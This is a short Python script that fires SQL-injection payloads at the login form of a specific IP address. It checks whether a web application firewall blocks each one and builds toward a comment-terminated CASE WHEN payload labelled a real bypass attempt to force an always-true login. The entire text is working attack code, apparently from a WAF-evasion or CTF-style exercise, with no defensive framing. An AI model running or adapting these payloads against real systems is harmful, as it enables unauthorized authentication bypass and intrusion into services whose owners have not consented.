import requests
def test(payload, label=""):
    r = requests.post("http://52.66.177.113/login.php", data={"username": payload, "password": "x"})
    waf = "BLOCKED" if "Suspicious input detected" in r.text else "clean"
    print(f"[{label:40}] waf={waf}")

test("admin'1>0", "digit-gt-digit-noquote")
test("admin'>0", "quote-gt-digit")
test("admin'1>'0", "digit-gt-quotedigit")
test("admin'>'0", "quote-gt-quotedigit (known clean)")
test("admin' CASE WHEN 'x'>'y' THEN 1 END", "case-when-quoted-strings-then")
test("admin' CASE WHEN ''>'' THEN 1 END", "case-when-empty-strings-then")
# Real bypass attempt: force always-true via CASE, no bare digits touching operators
test("' CASE WHEN 'a'>'' THEN 'x' ELSE 'y' END -- ", "full-case-bypass-attempt")
